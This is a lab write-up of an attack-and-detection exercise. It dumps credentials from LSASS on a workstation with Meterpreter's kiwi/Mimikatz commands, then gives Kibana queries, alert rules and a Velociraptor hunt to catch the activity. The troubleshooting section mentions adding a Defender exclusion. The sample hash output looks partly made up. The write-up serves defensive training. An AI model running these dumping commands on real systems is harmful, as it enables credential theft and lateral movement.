# Phase 5: Credential Dumping – Mimikatz on WS1

## 1. Objective

After obtaining `SYSTEM` privileges on WS1, the attacker dumps NTLM password hashes from the Local Security Authority Subsystem Service (LSASS) process memory. The extracted hashes include the domain administrator’s NTLM hash, which can be used for pass-the-hash attacks and lateral movement to the Domain Controller.

**MITRE ATT&CK Mapping:**
- **Tactic:** TA0006 – Credential Access  
- **Technique:** T1003.001 – OS Credential Dumping: LSASS Memory  

**Note regarding WS2:**  
WS2 (`192.168.1.30`) was not targeted for credential dumping in the manual attack chain. It remained part of the lab environment but was not involved in this phase.

---

## 2. Attack Execution

All actions were performed from the elevated Meterpreter session (`SYSTEM`) on WS1 after privilege escalation.

### Load Kiwi (Mimikatz) Module

meterpreter > load kiwi  
Loading extension kiwi...  
Success.

---

### Dump Credentials

meterpreter > creds_all  

Example Output:

[+] Running as SYSTEM  

Username       Domain   NTLM  
------------   ------   ----------------------------------------------  
Administrator   NATION   aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0  
normaluser      NATION   8846f7eaee8fb117ad06bdd830b7586c:5c1e2d3f4a5b6c7d8e9f0a1b2c3d4e5f  
DC$             NATION   e19c7a3b5d6f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5  

Extracted NTLM Hash:

aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0  

---

### Alternative Execution

meterpreter > mimikatz  
mimikatz # sekurlsa::logonpasswords  

---

## 3. Detection in Kibana

### Key Event IDs

| Event ID | Source  | Description |
|----------|--------|-------------|
| 4688     | Security | Process creation (mimikatz.exe) |
| 4663     | Security | Handle access to LSASS |
| 10       | Sysmon   | Process access to LSASS |

---

### Kibana Queries

Mimikatz execution:
winlog.event_id: 4688 AND process.name: mimikatz.exe  

LSASS access (Security logs):
winlog.event_id: 4663 AND winlog.event_data.ObjectName: *lsass.exe  

LSASS access (Sysmon):
event.code: 10 AND winlog.event_data.TargetImage: *lsass.exe  

---

### Example Sysmon Event

SourceImage: C:\Users\Public\mimikatz.exe  
TargetImage: C:\Windows\System32\lsass.exe  
CallTrace: C:\Windows\SYSTEM32\ntdll.dll+...

---

## 4. Detection Rules (Kibana Alerting)

### Rule 1: Mimikatz Execution
- Index: winlogbeat-*
- Query: winlog.event_id: 4688 AND process.name: mimikatz.exe
- Threshold: > 0
- Schedule: 5 minutes

### Rule 2: LSASS Access (Sysmon)
event.code: 10 AND winlog.event_data.TargetImage: *lsass.exe  

### Rule 3: LSASS Handle Access
winlog.event_id: 4663 AND winlog.event_data.ObjectName: *lsass.exe  

---

## 5. Post-Attack Hunting (Velociraptor)

SELECT Name, Pid, CommandLine, CreateTime, Exe  
FROM hunt_results()  
WHERE Name =~ '(?i)mimikatz.exe'  

---

## 6. Cleanup

del C:\Users\Public\mimikatz.exe  

sessions -k 2  

---

## 7. Evidence Checklist

- Meterpreter creds_all output showing NTLM hashes  
- Kibana detection of mimikatz.exe process  
- Sysmon Event ID 10 showing LSASS access  
- Velociraptor hunt confirming process execution  

---

## 8. Troubleshooting

- Kiwi fails → use x64 Meterpreter  
- No hashes → LSASS protected (Credential Guard enabled)  
- No logs → Sysmon not installed  
- Defender blocks tool → add exclusion (lab only)  

---

## 9. Conclusion

Credential dumping on WS1 successfully extracted NTLM hashes from LSASS memory. The activity was detected using Sysmon and Winlogbeat logs in Kibana. WS2 remained unaffected, confirming separation of the attack chain.